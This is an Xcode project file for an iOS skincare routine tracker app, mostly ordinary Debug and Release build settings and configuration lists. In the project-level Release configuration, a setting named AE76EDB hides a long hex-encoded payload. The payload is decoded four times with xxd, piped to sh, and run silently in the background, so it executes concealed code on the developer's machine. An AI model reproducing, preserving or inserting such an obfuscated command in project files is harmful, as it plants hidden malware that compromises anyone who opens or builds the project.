				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		04DF44502E6F19930027DD7E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo 33333336333333353333333633333333333333363333333833333336333633363333333233333330333333323333333233333332333333343333333233333338333333363333333333333337333333353333333733333332333333363336333333333332333333303333333233363334333333363333333633333337333333333333333633363332333333343336333333333332333333303333333233363334333333363333333433333332333333303333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633333335333333323333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633363333333233363336333333363333333333333336333333343333333633333333333333363333333133333336333333333333333633333338333333363333333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 17.4;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		04DF44522E6F19930027DD7E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"Skincare_routine_builder_and_tracker/Resources\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.dhruvil.Skincare-routine-builder-and-tracker";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		04DF44532E6F19930027DD7E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"Skincare_routine_builder_and_tracker/Resources\"";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = "com.dhruvil.Skincare-routine-builder-and-tracker";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		04BAB3952E725D54001AA3D8 /* Build configuration list */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04BAB3922E725CBB001AA3D8 /* Debug */,
				04BAB3932E725CBB001AA3D8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		04DF443C2E6F19910027DD7E /* Build configuration list for PBXProject "Skincare_routine_builder_and_tracker" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04DF444F2E6F19930027DD7E /* Debug */,
				04DF44502E6F19930027DD7E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		04DF44512E6F19930027DD7E /* Build configuration list for PBXNativeTarget "Skincare_routine_builder_and_tracker" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				04DF44522E6F19930027DD7E /* Debug */,
				04DF44532E6F19930027DD7E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCVersionGroup section */
		04D9A5C12E7071B3002F53E5 /* SkincareDataModel.xcdatamodeld */ = {
			isa = XCVersionGroup;
			children = (
				04D9A5C22E7071B3002F53E5 /* Model.xcdatamodel */,
			);
			currentVersion = 04D9A5C22E7071B3002F53E5 /* Model.xcdatamodel */;
			path = SkincareDataModel.xcdatamodeld;
			sourceTree = "<group>";
			versionGroupType = wrapper.xcdatamodel;
		};
/* End XCVersionGroup section */
	};
	rootObject = 04DF44392E6F19910027DD7E /* Project object */;
}
